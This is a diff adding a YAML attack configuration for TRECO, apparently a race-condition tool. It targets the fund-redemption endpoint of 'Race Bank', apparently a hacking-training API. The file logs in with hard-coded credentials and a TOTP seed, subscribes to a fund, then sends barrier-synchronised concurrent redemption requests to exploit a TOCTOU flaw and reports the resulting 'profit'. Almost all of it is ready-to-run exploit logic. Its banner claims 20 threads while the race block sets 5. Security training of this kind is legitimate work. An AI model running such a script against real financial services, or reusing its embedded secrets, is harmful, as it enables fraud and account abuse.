@@ -1,0 +1,304 @@
+# ============================================================================
+# TRECO Configuration: Race Bank - Fund Redemption Attack
+# ============================================================================
+#
+# Exploits race conditions in fund redemption operations by sending multiple
+# concurrent requests that attempt to redeem the same investment simultaneously.
+#
+# Target: Hack N' Roll Race Bank API
+# Attack: TOCTOU (Time-of-Check Time-of-Use) in redemption endpoint
+#
+# Usage:
+#   uv run treco race-bank-redemption.yaml
+#
+# ============================================================================
+
+metadata:
+  name: "Race Bank - Fund Redemption Attack"
+  version: "2.0"
+  author: "Hack N' Roll Security Team"
+  vulnerability: "CWE-362 (TOCTOU)"
+  description: |
+    Server fails to properly synchronize redemption operations, allowing
+    multiple redemptions of the same investment - money multiplication.
+
+config:
+  host: "bankao-api.hacknroll.academy"
+  port: 443
+  threads: 20
+  reuse_connection: false
+  tls:
+    enabled: true
+    verify_cert: true
+
+entrypoints:
+  - state: auth_login
+    input:
+      username: "crash"
+      password: "bhack123"
+      totp_seed: "OZDIJJEHAXPAGSBXPG5TLGDIZKFR7YNT"
+      subscribe_amount: 200
+      redeem_amount: 20
+
+# ============================================================================
+# STATES
+# ============================================================================
+
+states:
+
+  # --------------------------------------------------------------------------
+  # Authentication
+  # --------------------------------------------------------------------------
+
+  auth_login:
+    description: "Login with credentials"
+    request: |
+      POST /login HTTP/1.1
+      Host: {{ config.host }}
+      Content-Type: application/json
+      
+      {"username": "{{ username }}", "password": "{{ password }}"}
+
+    extract:
+      temp_token:
+        type: jpath
+        pattern: "$.token"
+
+    logger:
+      on_state_enter: |
+
+        ╔══════════════════════════════════════════════════════════════╗
+        ║  🦎 TRECO - Fund Redemption Race Attack                      ║
+        ╠══════════════════════════════════════════════════════════════╣
+        ║  🎯 Target: {{ config.host }}
+        ║  👤 User:   {{ username }}
+        ╚══════════════════════════════════════════════════════════════╝
+
+      on_state_leave: |
+        🔐 Login successful → temp token received
+
+    next:
+      - on_status: 200
+        goto: auth_2fa
+      - on_status: 401
+        goto: auth_failed
+
+  auth_2fa:
+    description: "TOTP verification"
+    request: |
+      POST /2fa HTTP/1.1
+      Host: {{ config.host }}
+      Content-Type: application/json
+      Authorization: Bearer {{ auth_login.temp_token }}
+      
+      {"token": "{{ totp(totp_seed) }}"}
+
+    extract:
+      token:
+        type: jpath
+        pattern: "$.access_token"
+
+    logger:
+      on_state_leave: |
+        🔑 2FA verified → session established
+
+    next:
+      - on_status: 200
+        goto: get_initial_balance
+      - on_status: 401
+        goto: auth_failed
+
+  auth_failed:
+    description: "Authentication failed"
+    logger:
+      on_state_enter: |
+        ❌ Authentication failed - check credentials
+    next:
+      - goto: end
+
+  # --------------------------------------------------------------------------
+  # Setup Phase
+  # --------------------------------------------------------------------------
+
+  get_initial_balance:
+    description: "Get initial balance"
+    request: |
+      GET /balance HTTP/1.1
+      Host: {{ config.host }}
+      Authorization: Bearer {{ auth_2fa.token }}
+
+    extract:
+      cash:
+        type: jpath
+        pattern: "$.cash_balance"
+      shares:
+        type: jpath
+        pattern: "$.fund_shares"
+
+    logger:
+      on_state_leave: |
+        💰 Balance: ${{ get_initial_balance.cash }} | 📈 Shares: {{ get_initial_balance.shares }}
+
+    next:
+      - on_status: 200
+        goto: subscribe_fund
+
+  subscribe_fund:
+    description: "Subscribe to fund"
+    request: |
+      POST /subscribe HTTP/1.1
+      Host: {{ config.host }}
+      Content-Type: application/json
+      Authorization: Bearer {{ auth_2fa.token }}
+      
+      {"amount": {{ subscribe_amount }}}
+
+    extract:
+      new_shares:
+        type: jpath
+        pattern: "$.new_fund_shares"
+      new_cash:
+        type: jpath
+        pattern: "$.new_cash_balance"
+
+    logger:
+      on_state_leave: |
+        📥 Subscribed ${{ subscribe_amount }} → {{ subscribe_fund.new_shares }} shares
+
+    next:
+      - on_status: 200
+        goto: race_redemption
+
+  # --------------------------------------------------------------------------
+  # Race Attack
+  # --------------------------------------------------------------------------
+
+  race_redemption:
+    description: "Race condition - redeem same shares multiple times"
+    request: |
+      POST /redemption HTTP/1.1
+      Host: {{ config.host }}
+      Content-Type: application/json
+      Authorization: Bearer {{ auth_2fa.token }}
+      
+      {"amount": {{ redeem_amount }}}
+
+    race:
+      threads: 5
+      sync_mechanism: barrier
+      connection_strategy: preconnect
+      thread_propagation: single
+
+    extract:
+      new_cash:
+        type: jpath
+        pattern: "$.new_cash_balance"
+      new_shares:
+        type: jpath
+        pattern: "$.new_fund_shares"
+      share_price:
+        type: jpath
+        pattern: "$.share_price"
+
+    logger:
+      on_state_enter: |
+
+        ┌──────────────────────────────────────────────────────────────┐
+        │  ⚡ RACE ATTACK                                              │
+        ├──────────────────────────────────────────────────────────────┤
+        │  🔗 Endpoint:  POST /redemption                              │
+        │  🧵 Threads:   20                                            │
+        │  🔧 Strategy:  preconnect + barrier                          │
+        │  💵 Amount:    {{ redeem_amount }} shares each                          │
+        └──────────────────────────────────────────────────────────────┘
+
+      on_thread_leave: |
+        {% if response.status_code == 200 %}
+          🟢 [t:{{ '%02d' | format(thread.id) }}] Redeemed → ${{ new_cash }} | {{ timing_ms }}ms
+        {% elif response.status_code == 409 %}
+          🔴 [t:{{ '%02d' | format(thread.id) }}] Conflict (already redeemed)
+        {% elif response.status_code == 423 %}
+          🔴 [t:{{ '%02d' | format(thread.id) }}] Locked
+        {% else %}
+          🟡 [t:{{ '%02d' | format(thread.id) }}] {{ response.status_code }}
+        {% endif %}
+
+      on_state_leave: |
+
+        └─ ⚡ Race complete
+
+    next:
+      - goto: get_final_balance
+        delay_ms: 500
+
+  # --------------------------------------------------------------------------
+  # Results
+  # --------------------------------------------------------------------------
+
+  get_final_balance:
+    description: "Get final balance"
+    request: |
+      GET /balance HTTP/1.1
+      Host: {{ config.host }}
+      Authorization: Bearer {{ auth_2fa.token }}
+
+    extract:
+      cash:
+        type: jpath
+        pattern: "$.cash_balance"
+      shares:
+        type: jpath
+        pattern: "$.fund_shares"
+
+    logger:
+      on_state_leave: |
+        {% set initial = get_initial_balance.cash | float %}
+        {% set final = get_final_balance.cash | float %}
+        {% set diff = final - initial %}
+
+        ┌──────────────────────────────────────────────────────────────┐
+        │  📊 RESULTS                                                  │
+        ├──────────────────────────────────────────────────────────────┤
+        │  💵 Initial Cash:    ${{ get_initial_balance.cash }}
+        │  💵 Final Cash:      ${{ get_final_balance.cash }}
+        │  📈 Initial Shares:  {{ get_initial_balance.shares }}
+        │  📈 Final Shares:    {{ get_final_balance.shares }}
+        ├──────────────────────────────────────────────────────────────┤
+        │  📉 Subscribed:      ${{ subscribe_amount }}
+        │  💰 Net Change:      ${{ diff }}
+        {% if diff > 0 %}
+        ├──────────────────────────────────────────────────────────────┤
+        │  🎉 VULNERABLE - Money multiplied!                           │
+        │  💸 Profit: ${{ diff }}
+        {% elif diff == 0 %}
+        ├──────────────────────────────────────────────────────────────┤
+        │  ⚠️  Break even - partial exploitation?                      │
+        {% else %}
+        ├──────────────────────────────────────────────────────────────┤
+        │  ✅ PROTECTED - No race condition                            │
+        {% endif %}
+        └──────────────────────────────────────────────────────────────┘
+
+    next:
+      - goto: end
+
+  # --------------------------------------------------------------------------
+  # Terminal States
+  # --------------------------------------------------------------------------
+
+  error:
+    description: "Error handler"
+    logger:
+      on_state_enter: |
+        ❌ An error occurred during execution
+    next:
+      - goto: end
+
+  end:
+    description: "Complete"
+    logger:
+      on_state_enter: |
+
+        ──────────────────────────────────────────────────────────────
+        🏁 Attack sequence complete
+        ──────────────────────────────────────────────────────────────
